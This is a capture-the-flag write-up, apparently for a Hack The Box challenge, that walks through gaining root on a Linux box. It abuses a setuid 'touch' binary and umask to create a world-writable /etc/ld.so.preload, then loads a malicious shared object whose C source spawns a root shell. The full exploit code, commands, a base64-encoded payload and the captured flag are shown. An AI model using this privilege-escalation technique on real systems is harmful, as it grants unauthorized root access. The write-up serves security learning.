# Misc

## Description

Push me, and then just touch me, till I can get my, Satisfaction!
## Solution

We are given a netcat port to connect to and are dropped to reverse shell looking shell. From start we are in `/` directory, but we can quickly find ourselves in `/home/ctf` with `touch` symlink which points to suid bit `touch` binary.

```bash
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ ls -l touch
lrwxrwxrwx 1 root root 14 Aug  2  2022 touch -> /usr/bin/touch
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ ls -l /usr/bin/touch
lrwxrwxrwx 1 root root 10 Aug  1  2022 /usr/bin/touch -> /bin/touch
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ ls -l /bin/touch
-rwsr-sr-x 1 root root 97152 Feb 28  2019 /bin/touch
```

_[touch](https://man7.org/linux/man-pages/man1/touch.1.html) - change file timestamps_, additionally it creates file if it doesn't exist.

When we create a file we have 644 (`rw-r--r--`) permissions.
```bash
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ ./touch /tmp/sadf
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ ls -l /tmp/sadf
-rw-r--r-- 1 root root 0 Aug 23 06:45 /tmp/sadf
```

_The default permissions for new files is determined by the "umask" command_ [src](https://cets.seas.upenn.edu/answers/permissions.html)

[AskUbuntu > What is "umask" and how does it work?](https://askubuntu.com/questions/44542/what-is-umask-and-how-does-it-work)

Turns out we can modify the mask and create file that have `write` permissions by all
```bash
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ umask 0000
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ ./touch /tmp/sadf2
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$  ls /tmp/sadf2 -alh
-rw-rw-rw- 1 root root 0 Aug 23 07:17 /tmp/sadf2
```

Touch doesn't allow recreating files, only creating. This means we can't overwrite the existing files like `/etc/passwd` to gain write permissions and root doesn't seem to have `.ssh` directory :/

```bash
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:~$ ./touch /root/.ssh/authorized_keys
./touch: cannot touch '/root/.ssh/authorized_keys': No such file or directory
```

[HackTricks > Arbitrary File Write to Root > "/etc/ld.so.preload"](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/write-to-root#etc-ld.so.preload)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0); setuid(0);
    system("/bin/bash");
}
// gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Compile the `so` locally
```bash
└─$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
└─$ gzip -9 pe.so
└─$ base64 pe.so.gz -w0 > pe.so.gz.base64
└─$ cat pe.so.gz.base64
H4sICH4...cAAA== 
```

Copy the file to remote server
```bash
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:/tmp$ echo 'H4sICH4/yGYCA3BlLnNvAO1bT2zbVBh/TtI2pV3ajQHVOli0dYgh1dlSNnUMbUnT/BlkXQmrNCTATWKzWCROSRxoAYke0LQxTeqBAwc4gnpAgiPjAhICbgjtAoJLhTSpRUh0BxCXzbxnfy+xX+OWw8SF71fZP3/f88/P73vPr3L8vbfT+UxAkghHkJwmHYuQBPCVuNs3Sfrp/n6yxz43RPyxFvQyGXaI6XpctsjvEy+7dXZ9UfAL/AHxslvXS7dV2bFXT3t5UfIy1wV20CUkL4dBHoJtMuDYIo8RL/MYzt4yVXYchfaIvJ94meuepbpe8u/Bw12A+vzad1HysuSqd689XgjJzsyR8qr297d3Pnlk5si1N+8M/PjNT9//8gSPX48r/jxaPXB04/rtyHb32Ue3PV38+338ER//Az5+yfb3k1kISI4XKLqhm6RlVHXjFdLUzEu6yqjFaKlpajVS1UtluVmXT5Bs/uxUSonLcfm402bnT7KvL5FDrni39un97Ixx4QHrc8XWHkcuf8Ddby5/0OUfcflDBIFAIBAIBAKBQCC2wjr+W4zuD/9O90MHEvSI2RVWtLFmURz+ldns1WTjB9v+mdnslWTjK9u+yWz2KrLxGTXncldv5a73fDREX6Wufvc5u876KvV/yY4c84bX/IKaVHHZUaxfo+bKi19jzyAQCAQCgUAgEAgEAnHvENPMcqyqsu+YCw2tWi+qJFbSjVip2LR/BJBGg6fYt1b2wr/2h2VdpHx007ImQb8XWHqjQKTFYWl0sC+8IjnfZ9m2STX2N9VkZPhyILWrN5CiZzif65+i2zItn2XlkeFMZOTpoYHXw8vkzL5Tj0+MHcTeQSAQCAQCgUAgEIj/H3hu7CHgQWCet/vnXavOeB6SZXl+8QgkyfLc4ytQfh/YJ4EH+PnAPLd2/YzDPAd3Xnjv7QN+CHgZhHctuB+wLbB5OzbBLgT/m/jxfG4RD0L8HgU+AZwBzqZST0Yfm9ZKetGIHpuQ4/LR8fjEETjcvr9C5LbVraybv9fW7Npyn0PQOzz/neOgfX6k3T8c7HeJbnnez/j4X/Lxv+rjf4f45IsvaHKZKNPPzyTPnU0RRcnOzCnpnJIpJM+lldx0gSjZ/PmpZF45n8k8l76gXEhO5dMKJJgn3BnkTnq512Xnn4uuluByUtaJ3FyqmcUSZbPhcIUfGXVTky8ZLbnU0qvquK4S26qwH3tkdcmgSofNhlPymtZo6nXDYyi0rKFVi/JC1SSyqS3SfaOuFs0ikbWK8nKjWNOUitroWPY1izW9TK9TNx1duV6raYZ5r8b3KPHmyvutt+iMQS/Y8oe/6DPZfs4DXh4T5oUw2TruBlz183mG84qrXsml5/NNAq4dEOYtzid95kOOHMwxXM/nFc6Dwv0HBJ6DOavd/qCXoz73z6FC2ZQwD3Ked9Uf6dJ+nQhrRIT1QLNCfeKyIUPQ8+dzy3PqEz8TfO21FlEvP7yD/i1B77dux2/8vSvoE1EvvyCcL8b/PWh7UJjv+boevj4pJOh5/D6E+sX/e+uxzvjuVj/nj0Ev/kuIguOAT/zcHOjyXCdAH4YTd0M7xfHTT7zrYdrPxbFOfLfrv90++pug/3QH/T+Y7fgWSDcAAA==' | base64 -d > pe.so.gz
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:/tmp$ gzip -d pe.so.gz
ctf@ng-932570-misctouchmp-xedvo-5894b48d9d-f7crn:/tmp$ ls -lh pe.so
-rw-r--r-- 1 ctf ctf 14K Aug 23 07:53 pe.so

ctf@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/tmp$ ls -l /etc/ld.so.preload
ls: cannot access '/etc/ld.so.preload': No such file or directory
ctf@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/tmp$ umask 0000
ctf@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/tmp$ ~/touch /etc/ld.so.preload
ctf@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/tmp$ ls -l /etc/ld.so.preload
-rw-rw-rw- 1 root root 0 Aug 23 07:57 /etc/ld.so.preload

ctf@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/tmp$ echo "/tmp/pe.so" > /etc/ld.so.preload

ctf@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/tmp$ ~/touch pwned
script /dev/null -qc /bin/bash # Get Pty Shell
root@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/tmp# cd /root
root@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/root# ls -alh
total 20K
drwx------ 1 root root 4.0K Aug  2  2022 .
drwxr-xr-x 1 root root 4.0K Aug 23 08:02 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   38 Jul 12  2020 flag.txt
root@ng-932570-misctouchmp-xpcyy-69f499db65-mgclr:/root# cat flag.txt
HTB{d75bdf6f50f17a639935792367e4788f}
```

> Flag: `HTB{d75bdf6f50f17a639935792367e4788f}`


